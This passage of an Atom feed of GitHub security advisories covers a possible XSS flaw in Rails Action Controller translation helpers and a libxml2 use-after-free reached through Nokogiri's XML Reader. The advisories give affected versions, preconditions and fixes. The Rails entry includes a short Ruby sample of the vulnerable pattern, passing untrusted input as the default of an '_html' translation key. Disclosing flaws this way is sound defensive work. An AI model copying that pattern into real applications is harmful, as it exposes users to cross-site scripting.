<h2 id="releases">Releases</h2>
<p>The fixed releases are available at the normal locations.</p>
<h2 id="workarounds">Workarounds</h2>
<p>There are no feasible workarounds for this issue.</p>
<h2 id="patches">Patches</h2>
<p>To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.</p>
<ul>
<li>7-0-translate-xss.patch - Patch for 7.0 series</li>
<li>7-1-translate-xss.patch - Patch for 7.1 series</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Thanks to <a href="https://hackerone.com/ooooooo_q">ooooooo_q</a> for the patch and fix!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rails/rails/security/advisories/GHSA-9822-6m93-xqf4">https://github.com/rails/rails/security/advisories/GHSA-9822-6m93-xqf4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-26143">https://nvd.nist.gov/vuln/detail/CVE-2024-26143</a></li>
<li><a href="https://github.com/rails/rails/commit/4c83b331092a79d58e4adffe4be5f250fa5782cc">https://github.com/rails/rails/commit/4c83b331092a79d58e4adffe4be5f250fa5782cc</a></li>
<li><a href="https://github.com/rails/rails/commit/5187a9ef51980ad1b8e81945ebe0462d28f84f9e">https://github.com/rails/rails/commit/5187a9ef51980ad1b8e81945ebe0462d28f84f9e</a></li>
<li><a href="https://discuss.rubyonrails.org/t/possible-xss-vulnerability-in-action-controller/84947">https://discuss.rubyonrails.org/t/possible-xss-vulnerability-in-action-controller/84947</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26143.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26143.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-9822-6m93-xqf4">https://github.com/advisories/GHSA-9822-6m93-xqf4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9822-6m93-xqf4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-27T21:41:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rails] Rails has possible XSS Vulnerability in Action Controller]]></title>
        <id>https://github.com/advisories/GHSA-9822-6m93-xqf4</id>
        <link href="https://github.com/advisories/GHSA-9822-6m93-xqf4"/>
        <updated>2024-03-21T21:53:33.000Z</updated>
        <content type="html"><![CDATA[<h1 id="possible-xss-vulnerability-in-action-controller">Possible XSS Vulnerability in Action Controller</h1>
<p>There is a possible XSS vulnerability when using the translation helpers
(<code>translate</code>, <code>t</code>, etc) in Action Controller. This vulnerability has been
assigned the CVE identifier CVE-2024-26143.</p>
<p>Versions Affected:  &gt;= 7.0.0.
Not affected:       &lt; 7.0.0
Fixed Versions:     7.1.3.1, 7.0.8.1</p>
<h2 id="impact">Impact</h2>
<p>Applications using translation methods like <code>translate</code>, or <code>t</code> on a
controller, with a key ending in "_html", a <code>:default</code> key which contains
untrusted user input, and the resulting string is used in a view, may be
susceptible to an XSS vulnerability.</p>
<p>For example, impacted code will look something like this:</p>
<pre><code class="language-ruby">class ArticlesController &lt; ApplicationController
  def show  
    @message = t("message_html", default: untrusted_input)
    # The `show` template displays the contents of `@message`
  end
end
</code></pre>
<p>To reiterate the pre-conditions, applications must:</p>
<ul>
<li>Use a translation function from a controller (i.e. <em>not</em> I18n.t, or <code>t</code> from
a view)</li>
<li>Use a key that ends in <code>_html</code></li>
<li>Use a default value where the default value is untrusted and unescaped input</li>
<li>Send the text to the victim (whether that's part of a template, or a
<code>render</code> call)</li>
</ul>
<p>All users running an affected release should either upgrade or use one of the
workarounds immediately.</p>
<h2 id="releases">Releases</h2>
<p>The fixed releases are available at the normal locations.</p>
<h2 id="workarounds">Workarounds</h2>
<p>There are no feasible workarounds for this issue.</p>
<h2 id="patches">Patches</h2>
<p>To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.</p>
<ul>
<li>7-0-translate-xss.patch - Patch for 7.0 series</li>
<li>7-1-translate-xss.patch - Patch for 7.1 series</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Thanks to <a href="https://hackerone.com/ooooooo_q">ooooooo_q</a> for the patch and fix!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rails/rails/security/advisories/GHSA-9822-6m93-xqf4">https://github.com/rails/rails/security/advisories/GHSA-9822-6m93-xqf4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-26143">https://nvd.nist.gov/vuln/detail/CVE-2024-26143</a></li>
<li><a href="https://github.com/rails/rails/commit/4c83b331092a79d58e4adffe4be5f250fa5782cc">https://github.com/rails/rails/commit/4c83b331092a79d58e4adffe4be5f250fa5782cc</a></li>
<li><a href="https://github.com/rails/rails/commit/5187a9ef51980ad1b8e81945ebe0462d28f84f9e">https://github.com/rails/rails/commit/5187a9ef51980ad1b8e81945ebe0462d28f84f9e</a></li>
<li><a href="https://discuss.rubyonrails.org/t/possible-xss-vulnerability-in-action-controller/84947">https://discuss.rubyonrails.org/t/possible-xss-vulnerability-in-action-controller/84947</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26143.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26143.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-9822-6m93-xqf4">https://github.com/advisories/GHSA-9822-6m93-xqf4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9822-6m93-xqf4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-27T21:41:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nokogiri] Use-after-free in libxml2 via Nokogiri::XML::Reader]]></title>
        <id>https://github.com/advisories/GHSA-vcc3-rw6f-jv97</id>
        <link href="https://github.com/advisories/GHSA-vcc3-rw6f-jv97"/>
        <updated>2024-03-18T20:38:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Nokogiri upgrades its dependency libxml2 as follows:</p>
<ul>
<li>v1.15.6 upgrades libxml2 to 2.11.7 from 2.11.6</li>
<li>v1.16.2 upgrades libxml2 to 2.12.5 from 2.12.4</li>
</ul>
<p>libxml2 v2.11.7 and v2.12.5 address the following vulnerability:</p>
<p>CVE-2024-25062 / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25062">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25062</a></p>
<ul>
<li>described at <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/604">https://gitlab.gnome.org/GNOME/libxml2/-/issues/604</a></li>
<li>patched by <a href="https://gitlab.gnome.org/GNOME/libxml2/-/commit/92721970">https://gitlab.gnome.org/GNOME/libxml2/-/commit/92721970</a></li>
</ul>
<p>Please note that this advisory only applies to the CRuby implementation of Nokogiri, and only if
the packaged libraries are being used. If you've overridden defaults at installation time to use
system libraries instead of packaged libraries, you should instead pay attention to your distro's
libxml2 release announcements.</p>
<p>JRuby users are not affected.</p>
<h3 id="severity">Severity</h3>
<p>The Nokogiri maintainers have evaluated this as <strong>Moderate</strong>.</p>
<h3 id="impact">Impact</h3>
<p>From the CVE description, this issue applies to the <code>xmlTextReader</code> module (which underlies
<code>Nokogiri::XML::Reader</code>):</p>
<blockquote>
<p>When using the XML Reader interface with DTD validation and XInclude expansion enabled,
processing crafted XML documents can lead to an xmlValidatePopElement use-after-free.</p>
</blockquote>
<h3 id="mitigation">Mitigation</h3>
<p>Upgrade to Nokogiri <code>~&gt; 1.15.6</code> or <code>&gt;= 1.16.2</code>.</p>
<p>Users who are unable to upgrade Nokogiri may also choose a more complicated mitigation: compile
and link Nokogiri against patched external libxml2 libraries which will also address these same
issues.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-xc9x-jj77-9p9j">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-xc9x-jj77-9p9j</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-xc9x-jj77-9p9j.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-xc9x-jj77-9p9j.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-vcc3-rw6f-jv97">https://github.com/advisories/GHSA-vcc3-rw6f-jv97</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vcc3-rw6f-jv97</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:38:40.000Z</published>
    </entry>
</feed>